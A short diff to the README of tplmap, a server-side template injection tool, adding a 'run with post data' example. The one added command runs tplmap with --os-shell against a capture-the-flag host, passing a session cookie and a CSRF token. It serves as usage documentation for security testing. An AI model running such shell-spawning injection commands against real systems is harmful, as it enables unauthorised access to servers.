@@ -152,3 +152,9 @@ See [burp_extension/README.md](burp_extension/README.md).
 [11]: http://jinja.pocoo.org/
 [12]: http://flask.pocoo.org/
 [2]: https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/
+
+## run with post data
+
+```
+./tplmap.py --os-shell -u 'http://ssti1.ctf.antichat.com/' -c 'Cookie: __cfduid=*' -c 'session=eyJjc3JmX3Rva2VuIjoiZWU5ZmE1MjhhMmVjNTg5NDdiZjk2ZTZmYTg3MmMxYzVlYThiZGYwOSJ9.Ech9Rg.vRHe1pFSnF0tBUpuFYzttwxlghU' -d 'csrf_token=ImVlOWZhNTI4YTJlYzU4OTQ3YmY5NmU2ZmE4NzJjMWM1ZWE4YmRmMDki.Ech9Rg.TjsaeHlhRFoyJSOVCzyEAmAIc9E&login=7'
+```
